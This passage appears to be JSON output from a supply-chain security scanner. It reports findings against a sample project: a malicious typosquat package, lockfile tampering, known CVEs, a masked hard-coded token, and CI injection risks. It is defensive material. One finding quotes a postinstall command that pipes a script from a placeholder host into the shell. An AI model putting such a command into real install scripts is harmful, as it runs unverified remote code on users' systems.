+    "advisory_id": "GHSA-hm6q-r2jc-cpqh",
+    "aliases": [
+     "CVE-2019-19771"
+    ],
+    "cves": [
+     "CVE-2019-19771"
+    ],
+    "cvss": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "severity_band": "High",
+    "fixed_versions": [],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.01257,
+    "epss_source": "live",
+    "path": [
+     "pkg:npm/lodahs@1.0.0"
+    ],
+    "all_paths": [
+     [
+      "pkg:npm/lodahs@1.0.0"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [],
+    "statically_referenced": false,
+    "exposed_routes": [],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2019-12-16T19:29:33Z",
+    "summary": "lodahs is malware",
+    "axes": {
+     "severity_band": "High",
+     "exploitability": "unknown",
+     "trust_alerts": 1,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known malicious package",
+   "band": "P0",
+   "band_reason": "OSV lists this package version in a malicious-package advisory",
+   "status": "open",
+   "id": "543e5b5b71ff",
+   "explanation": {
+    "finding_id": "543e5b5b71ff",
+    "claims": [
+     {
+      "text": "pkg:npm/lodahs@1.0.0 matches advisory GHSA-hm6q-r2jc-cpqh (High)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_5b910a8dea"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": null,
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "lodash",
+   "title": "Lockfile integrity of lodash@4.17.21 changed without a version change",
+   "locator": "package-lock.json@d0ff68ed9873b43ff3850e620c886f98e07a57e1",
+   "detector": "changes",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_32039c46c4"
+   ],
+   "signals": {
+    "signal": "integrity_changed_same_version",
+    "version": "4.17.21",
+    "commit": "d0ff68ed9873b43ff3850e620c886f98e07a57e1",
+    "manifest_changed_in_commit": false,
+    "message": "chore: refresh lockfile",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 3,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Lockfile tampering",
+   "band": "P0",
+   "band_reason": "3 independent strong supply-chain signals on the same package",
+   "status": "open",
+   "id": "ac3726cac7d6",
+   "explanation": {
+    "finding_id": "ac3726cac7d6",
+    "claims": [
+     {
+      "text": "Lockfile integrity of lodash@4.17.21 changed without a version change",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_32039c46c4"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Lockfile tampering (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_32039c46c4"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Regenerating the lockfile from the public registry and comparing hashes would confirm or clear tampering.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "lodash",
+   "title": "Resolved source of lodash moved from registry.npmjs.org to deps.example.invalid",
+   "locator": "package-lock.json@38e213c9c1ed5892335be4fdda7b405cd028365c",
+   "detector": "changes",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_4f43da958e"
+   ],
+   "signals": {
+    "signal": "resolved_host_changed",
+    "from_host": "registry.npmjs.org",
+    "host": "deps.example.invalid",
+    "commit": "38e213c9c1ed5892335be4fdda7b405cd028365c",
+    "message": "chore: use mirror",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 3,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Dependency source hijack",
+   "band": "P0",
+   "band_reason": "3 independent strong supply-chain signals on the same package",
+   "status": "open",
+   "id": "c3eef1b1a58b",
+   "explanation": {
+    "finding_id": "c3eef1b1a58b",
+    "claims": [
+     {
+      "text": "Resolved source of lodash moved from registry.npmjs.org to deps.example.invalid",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_4f43da958e"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Dependency source hijack (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_4f43da958e"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Restoring the registry URL in the lockfile would remove the source change.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "pkg:npm/lodash@4.17.21",
+   "title": "lodash is resolved from non-registry source deps.example.invalid",
+   "locator": "resolved:http://deps.example.invalid/lodash-4.17.21.tgz",
+   "detector": "changes",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_f9c918139f"
+   ],
+   "signals": {
+    "signal": "non_registry_source",
+    "host": "deps.example.invalid",
+    "url": "http://deps.example.invalid/lodash-4.17.21.tgz",
+    "insecure_http": true,
+    "scope": "prod",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 3,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Dependency source hijack",
+   "band": "P0",
+   "band_reason": "3 independent strong supply-chain signals on the same package",
+   "status": "open",
+   "id": "36ece35e755a",
+   "explanation": {
+    "finding_id": "36ece35e755a",
+    "claims": [
+     {
+      "text": "lodash is resolved from non-registry source deps.example.invalid",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_f9c918139f"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Dependency source hijack (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_f9c918139f"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Resolving this package from the official registry (and committing that lockfile) would remove the off-registry source.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:pypi/flask@2.0.1",
+   "title": "flask@2.0.1: Flask vulnerable to possible disclosure of permanent session cookie due to missing Vary: Cookie header",
+   "locator": "GHSA-m2qf-hxjv-5gpq",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_0ceec3ba4b",
+    "ev_75f69486c2"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-m2qf-hxjv-5gpq",
+    "aliases": [
+     "CVE-2023-30861",
+     "PYSEC-2023-62"
+    ],
+    "cves": [
+     "CVE-2023-30861"
+    ],
+    "cvss": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "severity_band": "High",
+    "fixed_versions": [
+     "2.2.5",
+     "2.3.2"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.0125,
+    "epss_source": "live",
+    "path": [
+     "pkg:pypi/flask@2.0.1"
+    ],
+    "all_paths": [
+     [
+      "pkg:pypi/flask@2.0.1"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "app/__init__.py:2",
+     "app/__init__.py:4",
+     "app/api/routes.py:2",
+     "app/api/routes.py:14"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [
+     "route:POST /checkout"
+    ],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2023-05-01T19:22:20Z",
+    "summary": "Flask vulnerable to possible disclosure of permanent session cookie due to missing Vary: Cookie header",
+    "axes": {
+     "severity_band": "High",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P1",
+   "band_reason": "high in runtime scope; reachability unknown (not downgraded)",
+   "status": "open",
+   "id": "2139e1509afd",
+   "explanation": {
+    "finding_id": "2139e1509afd",
+    "claims": [
+     {
+      "text": "pkg:pypi/flask@2.0.1 matches advisory GHSA-m2qf-hxjv-5gpq (High)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_0ceec3ba4b"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading flask to >= 2.2.5 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:npm/lodash@4.17.21",
+   "title": "lodash@4.17.21: lodash vulnerable to Code Injection via `_.template` imports key names",
+   "locator": "GHSA-r5fr-rjxr-66jc",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_521e4e986c",
+    "ev_a458dd965c"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-r5fr-rjxr-66jc",
+    "aliases": [
+     "CVE-2026-4800"
+    ],
+    "cves": [
+     "CVE-2026-4800"
+    ],
+    "cvss": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "severity_band": "High",
+    "fixed_versions": [
+     "4.18.0"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.0287,
+    "epss_source": "live",
+    "path": [
+     "pkg:npm/lodash@4.17.21"
+    ],
+    "all_paths": [
+     [
+      "pkg:npm/lodash@4.17.21"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "index.js:1"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2026-04-01T23:51:12Z",
+    "summary": "lodash vulnerable to Code Injection via `_.template` imports key names",
+    "axes": {
+     "severity_band": "High",
+     "exploitability": "unknown",
+     "trust_alerts": 3,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P1",
+   "band_reason": "high in runtime scope; reachability unknown (not downgraded)",
+   "status": "open",
+   "id": "7a5ab77e58ea",
+   "explanation": {
+    "finding_id": "7a5ab77e58ea",
+    "claims": [
+     {
+      "text": "pkg:npm/lodash@4.17.21 matches advisory GHSA-r5fr-rjxr-66jc (High)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_521e4e986c"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading lodash to >= 4.18.0 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:npm/minimist@0.0.8",
+   "title": "minimist@0.0.8: Prototype Pollution in minimist",
+   "locator": "GHSA-xvch-5gv4-984h",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_d39d93a6ae",
+    "ev_9efa116d52"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-xvch-5gv4-984h",
+    "aliases": [
+     "CVE-2021-44906"
+    ],
+    "cves": [
+     "CVE-2021-44906"
+    ],
+    "cvss": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "severity_band": "Critical",
+    "fixed_versions": [
+     "0.2.4",
+     "1.2.6"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.04581,
+    "epss_source": "live",
+    "path": [
+     "pkg:npm/mkdirp@0.5.1",
+     "pkg:npm/minimist@0.0.8"
+    ],
+    "all_paths": [
+     [
+      "pkg:npm/mkdirp@0.5.1",
+      "pkg:npm/minimist@0.0.8"
+     ]
+    ],
+    "direct": false,
+    "scope": "prod",
+    "imported_by": [],
+    "statically_referenced": false,
+    "exposed_routes": [],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2022-03-18T00:01:09Z",
+    "summary": "Prototype Pollution in minimist",
+    "axes": {
+     "severity_band": "Critical",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P1",
+   "band_reason": "critical in runtime scope; reachability unknown (not downgraded)",
+   "status": "open",
+   "id": "463b717571f5",
+   "explanation": {
+    "finding_id": "463b717571f5",
+    "claims": [
+     {
+      "text": "pkg:npm/minimist@0.0.8 matches advisory GHSA-xvch-5gv4-984h (Critical)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_d39d93a6ae"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "introduced transitively via pkg:npm/mkdirp@0.5.1 -> pkg:npm/minimist@0.0.8",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_2241661011"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading minimist to >= 0.2.4 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "package.json#postinstall",
+   "title": "'postinstall' script in package.json (pipe to shell)",
+   "locator": "package.json:8",
+   "detector": "install_scripts",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_96b883efa9"
+   ],
+   "signals": {
+    "signal": "install_script",
+    "pattern": "pipe_to_shell",
+    "command": "curl http://x.invalid/a.sh | sh",
+    "script": "postinstall",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 1,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Code injection",
+   "band": "P1",
+   "band_reason": "strong Code injection signal",
+   "status": "open",
+   "id": "50bd186d75c6",
+   "explanation": {
+    "finding_id": "50bd186d75c6",
+    "claims": [
+     {
+      "text": "'postinstall' script in package.json (pipe to shell)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_96b883efa9"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Code injection (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_96b883efa9"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Installing with --ignore-scripts (or removing the lifecycle script) would stop code running at install time.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "container",
+   "subject": "Dockerfile",
+   "title": "ADD fetches a remote URL at build time: http://example.invalid/x.tgz /tmp/x.tgz",
+   "locator": "Dockerfile:3",
+   "detector": "container",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_5aa277ad86"
+   ],
+   "signals": {
+    "rule": "DF004",
+    "detail": "http://example.invalid/x.tgz /tmp/x.tgz",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "Medium",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Remote code fetch at build",
+   "band": "P1",
+   "band_reason": "strong Remote code fetch at build signal",
+   "status": "open",
+   "id": "7e5a6bd29f76",
+   "explanation": {
+    "finding_id": "7e5a6bd29f76",
+    "claims": [
+     {
+      "text": "ADD fetches a remote URL at build time: http://example.invalid/x.tgz /tmp/x.tgz",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_5aa277ad86"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Remote code fetch at build (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_5aa277ad86"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Downloading with a verified checksum (or COPY from the build context) would remove the remote fetch.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "secret",
+   "subject": "config/dev.js:github_token",
+   "title": "Hard-coded credential in repository: github_token in config/dev.js",
+   "locator": "config/dev.js:1",
+   "detector": "secret",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_f5bed0480c"
+   ],
+   "signals": {
+    "rule": "SEC001",
+    "detail": "github_token in config/dev.js",
+    "kind": "github_token",
+    "sha256": "49e7237e11464693589bca95fe317f2fde5793bb7d70da9749f55641a5fff406",
+    "preview": "ghp_****(40 chars)",
+    "path": "config/dev.js",
+    "line": 1,
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Exposed secret",
+   "band": "P1",
+   "band_reason": "strong Exposed secret signal",
+   "status": "open",
+   "id": "d6508c147497",
+   "explanation": {
+    "finding_id": "d6508c147497",
+    "claims": [
+     {
+      "text": "Hard-coded credential in repository: github_token in config/dev.js",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_f5bed0480c"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Exposed secret (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_f5bed0480c"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Rotating the credential and moving it to a secret store would remove the exposure.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "pkg:npm/lodahs@1.0.0",
+   "title": "Possible typosquat: 'lodahs' resembles 'lodash'",
+   "locator": "name:lodahs",
+   "detector": "names",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_be4ab67b03",
+    "ev_82bbfea481"
+   ],
+   "signals": {
+    "signal": "name_confusion",
+    "similar_to": [
+     "lodash"
+    ],
+    "direct": true,
+    "scope": "prod",
+    "release_count": 1,
+    "first_release": "2019-11-25T16:49:21.220Z",
+    "source_repo": "https://github.com/npm/security-holder",
+    "has_install_script": true,
+    "metadata": "live",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 1,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Typosquatting",
+   "band": "P1",
+   "band_reason": "strong Typosquatting signal",
+   "status": "open",
+   "id": "1a5cc5904d4d",
+   "explanation": {
+    "finding_id": "1a5cc5904d4d",
+    "claims": [
+     {
+      "text": "Possible typosquat: 'lodahs' resembles 'lodash'",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_be4ab67b03"
+      ],
+      "confidence": "high",
+      "verifier_status": "downgraded",
+      "reason": "fact cited only derived evidence"
+     },
+     {
+      "text": "signal is consistent with: Typosquatting (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_be4ab67b03"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Confirming the intended package name with the team would resolve the typosquat question.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "ci",
+   "subject": ".github/workflows/ci.yml",
+   "title": "Untrusted GitHub context interpolated into a run step (script injection): ${{ github.event.pull_request.title }}",
+   "locator": ".github/workflows/ci.yml:12",
+   "detector": "ci",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_bb3ec61aa6"
+   ],
+   "signals": {
+    "rule": "CI004",
+    "detail": "${{ github.event.pull_request.title }}",
+    "expression": "${{ github.event.pull_request.title }}",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "CI script injection",
+   "band": "P1",
+   "band_reason": "strong CI script injection signal",
+   "status": "open",
+   "id": "bb05fb65eb18",
+   "explanation": {
+    "finding_id": "bb05fb65eb18",
+    "claims": [
+     {
+      "text": "Untrusted GitHub context interpolated into a run step (script injection): ${{ github.event.pull_request.title }}",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_bb3ec61aa6"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: CI script injection (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_bb3ec61aa6"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Passing the value through an env variable instead of ${{ }} interpolation would prevent injection.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "ci",
+   "subject": ".github/workflows/ci.yml",
+   "title": "Workflow triggered by pull_request_target: pull_request_target",
+   "locator": ".github/workflows/ci.yml:on",
+   "detector": "ci",
+   "classification": "S",
+   "raw_evidence_ids": [
+    "ev_46e30de372"
+   ],
+   "signals": {
+    "rule": "CI002",
+    "detail": "pull_request_target",
+    "with_write_permissions": true,
+    "checks_out_code": true,
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "medium"
+    }
+   },
+   "attack_class": "Privileged untrusted trigger",
+   "band": "P1",
+   "band_reason": "strong Privileged untrusted trigger signal",
+   "status": "open",
+   "id": "9ea1705d151b",
+   "explanation": {
+    "finding_id": "9ea1705d151b",
+    "claims": [
+     {
+      "text": "Workflow triggered by pull_request_target: pull_request_target",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_46e30de372"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Privileged untrusted trigger (classification S)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_46e30de372"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Using pull_request (not pull_request_target) or not checking out PR code would remove the privileged context.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:npm/lodash@4.17.21",
+   "title": "lodash@4.17.21: Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions",
+   "locator": "GHSA-xxjr-mmjv-4gpg",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_a1fcc9c906",
+    "ev_a458dd965c"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-xxjr-mmjv-4gpg",
+    "aliases": [
+     "CVE-2025-13465"
+    ],
+    "cves": [
+     "CVE-2025-13465"
+    ],
+    "cvss": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+    "severity_band": "Medium",
+    "fixed_versions": [
+     "4.17.23"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.01823,
+    "epss_source": "live",
+    "path": [
+     "pkg:npm/lodash@4.17.21"
+    ],
+    "all_paths": [
+     [
+      "pkg:npm/lodash@4.17.21"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "index.js:1"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2026-01-21T23:01:22Z",
+    "summary": "Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions",
+    "axes": {
+     "severity_band": "Medium",
+     "exploitability": "unknown",
+     "trust_alerts": 3,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P2",
+   "band_reason": "medium severity in runtime scope",
+   "status": "open",
+   "id": "bc3bf1629bc9",
+   "explanation": {
+    "finding_id": "bc3bf1629bc9",
+    "claims": [
+     {
+      "text": "pkg:npm/lodash@4.17.21 matches advisory GHSA-xxjr-mmjv-4gpg (Medium)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_a1fcc9c906"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading lodash to >= 4.17.23 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:npm/minimist@0.0.8",
+   "title": "minimist@0.0.8: Prototype Pollution in minimist",
+   "locator": "GHSA-vh95-rmgr-6w4m",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_de9b4ca267",
+    "ev_9efa116d52"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-vh95-rmgr-6w4m",
+    "aliases": [
+     "CVE-2020-7598"
+    ],
+    "cves": [
+     "CVE-2020-7598"
+    ],
+    "cvss": 5.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
+    "severity_band": "Medium",
+    "fixed_versions": [
+     "0.2.1",
+     "1.2.3"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.01931,
+    "epss_source": "live",
+    "path": [
+     "pkg:npm/mkdirp@0.5.1",
+     "pkg:npm/minimist@0.0.8"
+    ],
+    "all_paths": [
+     [
+      "pkg:npm/mkdirp@0.5.1",
+      "pkg:npm/minimist@0.0.8"
+     ]
+    ],
+    "direct": false,
+    "scope": "prod",
+    "imported_by": [],
+    "statically_referenced": false,
+    "exposed_routes": [],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2020-04-03T21:48:32Z",
+    "summary": "Prototype Pollution in minimist",
+    "axes": {
+     "severity_band": "Medium",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P2",
+   "band_reason": "medium severity in runtime scope",
+   "status": "open",
+   "id": "e5915268ccca",
+   "explanation": {
+    "finding_id": "e5915268ccca",
+    "claims": [
+     {
+      "text": "pkg:npm/minimist@0.0.8 matches advisory GHSA-vh95-rmgr-6w4m (Medium)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_de9b4ca267"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "introduced transitively via pkg:npm/mkdirp@0.5.1 -> pkg:npm/minimist@0.0.8",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_2241661011"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading minimist to >= 0.2.1 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:pypi/requests@2.25.1",
+   "title": "requests@2.25.1: Requests `Session` object does not verify requests after making first request with verify=False",
+   "locator": "GHSA-9wx4-h78v-vm56",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_e6808ddfe2",
+    "ev_bac97f356d"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-9wx4-h78v-vm56",
+    "aliases": [
+     "CVE-2024-35195",
+     "PYSEC-2026-1873"
+    ],
+    "cves": [
+     "CVE-2024-35195"
+    ],
+    "cvss": 5.6,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+    "severity_band": "Medium",
+    "fixed_versions": [
+     "2.32.0"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.0034,
+    "epss_source": "live",
+    "path": [
+     "pkg:pypi/requests@2.25.1"
+    ],
+    "all_paths": [
+     [
+      "pkg:pypi/requests@2.25.1"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "app/utils/helpers.py:2",
+     "app/utils/helpers.py:6"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [
+     "route:POST /checkout"
+    ],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2024-05-20T20:15:00Z",
+    "summary": "Requests `Session` object does not verify requests after making first request with verify=False",
+    "axes": {
+     "severity_band": "Medium",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P2",
+   "band_reason": "medium severity in runtime scope",
+   "status": "open",
